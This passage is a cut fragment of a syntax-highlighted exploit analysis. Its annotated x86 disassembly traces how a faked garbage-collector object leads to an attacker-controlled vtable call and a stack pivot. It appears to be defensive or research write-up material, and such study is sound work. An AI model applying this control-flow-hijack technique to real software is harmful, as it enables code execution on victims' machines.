id="crayon-5f69285f567a7439638303-24"><span class="crayon-cn">3.</span><span class="crayon-h">	</span><span class="crayon-e">The </span><span class="crayon-e">sub_105F07F0 </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">does </span><span class="crayon-e">the </span><span class="crayon-e">collection </span><span class="crayon-e">work </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">sends </span><span class="crayon-e">fake_gc_object </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>105F06F0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-25"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F07F0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">sub&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20h</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-26"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F07F3</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">esi</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-27"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F07F4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esi</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">esi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-28"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F07F6</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">byte</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">5</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-29"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F07FA</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jnz&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F08A2</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-30"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0800</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">1E4h</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-31"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0806</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-32"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0808</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">offset </span><span class="crayon-v">a_gc</span><span class="crayon-sy">_</span>collection<span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">".gc.CollectionWork"</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-33">…</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-34"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0861</span><span class="crayon-h"> </span><span class="crayon-v">loc_105F0861</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-35"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0861</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">char</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-36"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0863</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-37"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0865</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">esi</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-38"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0867</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>105F06F0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-39">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-40"><span class="crayon-cn">4.</span><span class="crayon-h">	</span><span class="crayon-e">The </span><span class="crayon-e">sub_105F06F0 </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">gets </span><span class="crayon-e">an </span><span class="crayon-e">unknown_object </span><span class="crayon-e">from </span><span class="crayon-e">fake_gc_object </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">sends </span><span class="crayon-e">it </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>100436E0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-41"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F06F0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">sub&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20h</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-42"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F06F3</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">esi</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-43"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F06F4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esi</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">esi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">fake_gc_object</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-44"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F06F6</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">byte</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">5</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-45"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F06FA</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jnz&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F0781</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-46"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0700</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">2B0h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-47"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0707</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jnz&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F0781</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-48"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0709</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">byte</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">2AAh</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-49"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0710</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jnz&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F0781</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-50"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0712</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">byte</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">7B8h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-51"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0719</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jnz&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F0781</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-52"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F071B</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">1E4h</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">eax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113d80</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-53"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0721</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">edi</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-54"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0722</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-55"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0724</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">offset </span><span class="crayon-v">a_gc</span><span class="crayon-sy">_</span>collect<span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">".gc.Collect"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-56"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0729</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">eax</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">eax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">unknown_object</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113d80</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-57"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F072A</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">lea&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">34h</span><span class="crayon-o">+</span><span class="crayon-v">var_20</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-58"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F072E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>100436E0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-59">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-60"><span class="crayon-cn">5.</span><span class="crayon-h">	</span><span class="crayon-e">The </span><span class="crayon-e">sub_100436E0 </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">wrapper </span><span class="crayon-t">function</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-e">it </span><span class="crayon-e">does </span><span class="crayon-e">nothing </span><span class="crayon-e">more </span><span class="crayon-e">than </span><span class="crayon-e">push </span><span class="crayon-i">the</span><span class="crayon-h"> </span><span class="crayon-cn">1st</span><span class="crayon-h"> </span><span class="crayon-e">argument </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">calls </span><span class="crayon-e">the </span><span class="crayon-e">sub_1004295C </span><span class="crayon-t">function</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-61"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436E0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">esi</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-62"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436E1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-o">+</span><span class="crayon-v">arg_8</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-63"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436E5</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esi</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-64"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436E7</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">8</span><span class="crayon-o">+</span><span class="crayon-v">arg_4</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-65"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436EB</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">offset </span><span class="crayon-v">off</span><span class="crayon-sy">_</span>10B5BEEC</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-66"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436F1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">0Ch</span><span class="crayon-o">+</span><span class="crayon-v">arg_0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">1st</span><span class="crayon-h"> </span><span class="crayon-e">argument </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-v">unknown</span><span class="crayon-sy">_</span>object</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-67"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">100436F5</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>1004295C</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-68">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-69"><span class="crayon-cn">6.</span><span class="crayon-h">	</span><span class="crayon-e">The </span><span class="crayon-e">sub_1004295C </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-i">performs</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">vtable </span><span class="crayon-e">call </span><span class="crayon-e">of </span><span class="crayon-e">unknown_object </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">stack </span><span class="crayon-e">pivot </span><span class="crayon-e">exec </span><span class="crayon-e">at </span><span class="crayon-v">last</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-70"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">1004295C</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-v">arg_4</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-71"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042960</span><span 